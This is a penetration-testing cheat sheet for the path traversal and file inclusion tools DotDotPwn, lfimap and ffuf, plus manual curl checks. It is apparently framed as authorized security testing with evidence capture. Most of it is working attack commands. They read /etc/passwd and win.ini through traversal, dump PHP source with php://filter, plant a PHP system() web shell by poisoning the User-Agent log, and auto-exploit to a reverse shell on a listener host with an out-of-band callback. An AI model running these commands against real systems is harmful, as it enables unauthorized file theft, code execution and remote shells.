# Tooling: DotDotPwn, lfimap, ffuf

## DotDotPwn

Traversal fuzzer; generates the encoding × depth cross-product and tests it.

```
# Fuzz a URL with the TRAVERSAL marker; -k = success pattern in response
dotdotpwn -m http-url -u "http://192.0.2.10/view?file=TRAVERSAL" -k "root:" -f /etc/passwd -d 8 -o unix

# Windows target
dotdotpwn -m http-url -u "http://192.0.2.10/view?file=TRAVERSAL" -k "\[fonts\]" -f windows/win.ini -o windows -d 8

# Fuzz a whole host's URL structure (no marker needed)
dotdotpwn -m http -h 192.0.2.10 -x 8080 -e .php -k "root:" -d 6

# Other modules: -m ftp | tftp | payload (raw protocol file with TRAVERSAL) | stdout
dotdotpwn -m payload -h 192.0.2.10 -x 443 -p raw_request.txt -k "root:" -s   # -s = SSL

# Generate the traversal wordlist only (feed to ffuf/Burp Intruder)
dotdotpwn -m stdout -d 6 > trav_words.txt
```

Key flags: `-m` module, `-u` URL with `TRAVERSAL` marker, `-k` match
pattern, `-f` target file to request, `-o unix|windows|generic` OS payload
set (`-O` to OS-detect via nmap), `-d` depth (default 6), `-e` extra
extension appended to each payload, `-X` bisection mode (binary-search the
working depth), `-b` break on first hit, `-q` quiet, `-r report.txt`.

Output: streams each payload; vulnerable ones are tagged
`<- VULNERABLE` / `[*] Testing Path: ... <- VULNERABLE!` and summarized at
the end ("Total Traversals found"). Also writes a report under its
`Reports/` dir. Feed the vulnerable lines to `scripts/parse_lfi.py
--dotdotpwn ddp.out`.

## lfimap

LFI/RFI exploitation framework — probes wrappers, traversal, heuristics,
and can auto-exploit to a shell.

```
# Single URL; PWN marks the injection point (default marker --placeholder PWN)
lfimap -U "http://192.0.2.10/view?file=PWN" -a

# From a file of URLs, or a raw Burp request (NOTE: -R uppercase, -r is RFI)
lfimap -F urls.txt -a
lfimap -R request.txt -a

# Technique selection (instead of -a): 
#   -f  php://filter      -i  php://input      -d  data://
#   -e  expect://         -t  truncation       -r / --rfi  remote inclusion
#   -c  cmd-injection checks
lfimap -U "http://192.0.2.10/view?file=PWN" -f -i -d -t

# Auth / shaping
lfimap -U "..." -C "PHPSESSID=abc" -H "X-Forwarded-For: 127.0.0.1" --http-ok 200,500

# Exploitation: reverse shell when a vector allows it
lfimap -U "http://192.0.2.10/view?file=PWN" -a -x --lhost 198.51.100.9 --lport 4444

# Out-of-band verification (RFI / blind)
lfimap -U "..." -a --callback oob.example.net

# Useful: -n <proxy>, -v verbose, --log file, --no-stop (don't stop at first vuln)
```

Reading output: lines prefixed `[+]` are confirmed vectors and name the
technique and the final URL, e.g.
`[+] LFI -> 'http://192.0.2.10/view?file=php://filter/convert.base64-encode/resource=index.php'`.
`[i]`/`[-]` are info/negative. With `-x` it reports the shell session on
success. Capture with `--log lfimap.out` and hand to
`scripts/parse_lfi.py --lfimap lfimap.out`.

## ffuf

Generic engine — best for custom traversal lists, parameter discovery, and
locating stored/looted files.

```
# traversal wordlist against a param; match on content, not status
ffuf -u "http://192.0.2.10/view?file=FUZZ" -w trav_words.txt \
     -mr "root:" -o ffuf_trav.json -of json

# which PARAM is file-ish? fuzz names with a canary value
ffuf -u "http://192.0.2.10/view?FUZZ=../../../etc/passwd" -w paramnames.txt -mr "root:"

# target-file sweep once traversal depth is known
ffuf -u "http://192.0.2.10/view?file=../../../../FUZZ" -w interesting_files.txt \
     -fs <baseline_size> -o ffuf_files.json -of json

# path-segment traversal (encode dots so ffuf/your proxy doesn't normalize)
ffuf -u "http://192.0.2.10/files/FUZZ" -w encoded_trav.txt -mc 200 -fs 0
```

Flags that matter here: `-mr` regex match, `-fs`/`-fc`/`-fw` filter by
size/code/words (filter the baseline!), `-H "Cookie: ..."` auth,
`-t` threads, `-x` proxy (route through Burp to keep evidence),
`-of json -o file` machine-readable (results under the `results` key:
`input.FUZZ`, `url`, `status`, `length`). `parse_lfi.py --ffuf
ffuf_trav.json` ingests it.

## curl notes for manual confirmation

```
curl --path-as-is "http://192.0.2.10/files/../../../etc/passwd"   # keep dot-segments
curl -s "http://192.0.2.10/view?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=index.php" | base64 -d
curl -A "<?php system(\$_GET['c']); ?>" http://192.0.2.10/          # log poison
```

Always re-capture the winning request/response through the proxy (Burp
Repeater or `mitmdump -w evidence.flows "~u view"`) — that exchange is the
finding evidence.
